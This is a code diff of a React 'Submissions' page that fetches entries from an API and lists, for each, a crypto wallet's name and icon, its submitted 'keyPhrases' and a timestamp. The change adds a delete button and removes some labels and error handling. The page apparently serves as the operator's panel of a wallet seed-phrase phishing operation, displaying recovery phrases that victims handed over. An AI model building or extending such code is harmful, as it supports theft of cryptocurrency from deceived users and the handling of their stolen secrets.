@@ -2,36 +2,42 @@ import React, { useState, useEffect } from "react";
 
 const SubmissionsPage = () => {
   const [submissions, setSubmissions] = useState([]);
-  const [loading, setLoading] = useState(true);
 
   useEffect(() => {
     const fetchSubmissions = async () => {
       try {
         const response = await fetch("/api/submissions");
-        if (!response.ok) {
-          throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-
         const data = await response.json();
-        console.log("Fetched submissions:", data);
         setSubmissions(data.submissions);
       } catch (error) {
         console.error("Error fetching submissions:", error);
-      } finally {
-        setLoading(false);
       }
     };
 
     fetchSubmissions();
   }, []);
 
-  if (loading) return <p>Loading submissions...</p>;
+  const handleDelete = async (timestamp) => {
+    try {
+      await fetch("/api/submissions", {
+        method: "DELETE",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ timestamp }),
+      });
+
+      setSubmissions((prev) =>
+        prev.filter((submission) => submission.timestamp !== timestamp)
+      );
+    } catch (error) {
+      console.error("Error deleting submission:", error);
+    }
+  };
 
   return (
     <div className="submissions-container">
-      <h2>Admin Submissions</h2>
+      <h2>Submissions</h2>
       {submissions.length === 0 ? (
-        <p>No submissions yet.</p>
+        <p>No submissions found.</p>
       ) : (
         submissions.map((submission, index) => (
           <div key={index} className="submission-card">
@@ -39,8 +45,9 @@ const SubmissionsPage = () => {
               <img src={submission.wallet.icon} alt={submission.wallet.name} />
               <h3>{submission.wallet.name}</h3>
             </div>
-            <p>Key Phrases: {submission.keyPhrases}</p>
+            <p>{submission.keyPhrases}</p>
             <small>{new Date(submission.timestamp).toLocaleString()}</small>
+            <button onClick={() => handleDelete(submission.timestamp)}>Delete</button>
           </div>
         ))
       )}
